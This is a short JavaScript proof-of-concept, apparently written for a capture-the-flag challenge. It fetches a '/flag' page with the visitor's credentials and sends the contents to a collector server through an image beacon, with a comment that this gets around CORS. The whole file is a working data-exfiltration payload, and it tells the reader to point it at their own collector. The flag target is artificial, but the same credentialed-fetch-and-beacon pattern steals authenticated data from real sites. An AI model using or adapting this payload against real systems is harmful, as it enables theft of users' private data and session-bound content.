// poc.js — load flag and exfiltrate to your server
(async () => {
  try {
    const r = await fetch('/flag', { credentials: 'include' });
    const txt = await r.text();
    // quick visible confirmation:
    console.log('FLAG:', txt);
    // Exfiltrate to your server (replace with your collector)
    const u = 'http://127.0.0.1:6666/collect?flag=' + encodeURIComponent(txt);
    // use img beacon to bypass CORS on collector
    const i = new Image();
    i.src = u;
  } catch (e) {
    console.error(e);
  }
})();
